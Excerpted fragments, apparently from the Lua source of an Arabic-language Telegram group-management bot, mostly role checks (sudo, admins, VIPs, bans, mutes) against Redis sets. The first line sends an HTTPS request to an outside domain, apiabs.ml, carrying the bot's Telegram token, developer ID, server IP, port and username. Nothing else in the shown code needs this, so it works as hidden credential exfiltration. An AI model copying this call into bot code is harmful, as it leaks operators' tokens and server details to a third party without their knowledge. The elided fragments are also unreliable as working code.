...
https.request("https://apiabs.ml/config.php?Get=SURSBER&DevId="..DevRio:get(Server.."IdSURSBER").."&TokenBot="..DevRio:get(Server.."TokenSURSBER").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
...
NameBot = (DevRio:get(SURSBER..'Abs:NameBot') or 'بروكس')
--     Source SURSBER     --
...
local Status = DevRio:sismember(SURSBER..'Abs:SecondSudo:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(SURSBER..'Abs:SudoBot:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(SURSBER..'Abs:ManagerAll:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(SURSBER..'Abs:AdminAll:',msg.sender_user_id_) 
...
------ Vip Member All ------
function VipAll(msg) 
local Status = DevRio:sismember(SURSBER..'Abs:VipAll:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(SURSBER..'Abs:AbsConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
local Status = DevRio:sismember(SURSBER..'Abs:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(SURSBER..'Abs:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(SURSBER..'Abs:Managers:'..msg.chat_id_,msg.sender_user_id_) 
...
----------  Admin  ---------
function Admin(msg) 
local Status = DevRio:sismember(SURSBER..'Abs:Admins:'..msg.chat_id_,msg.sender_user_id_) 
...
---------Vip Member---------
function VipMem(msg) 
local Status = DevRio:sismember(SURSBER..'Abs:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(SURSBER..'Abs:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
...
if DevRio:sismember(SURSBER..'Abs:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(SURSBER..'Abs:BanAll:', user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(SURSBER..'Abs:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(SURSBER..'Abs:MuteAll:', user_id) then
var = true
else
var = false
end
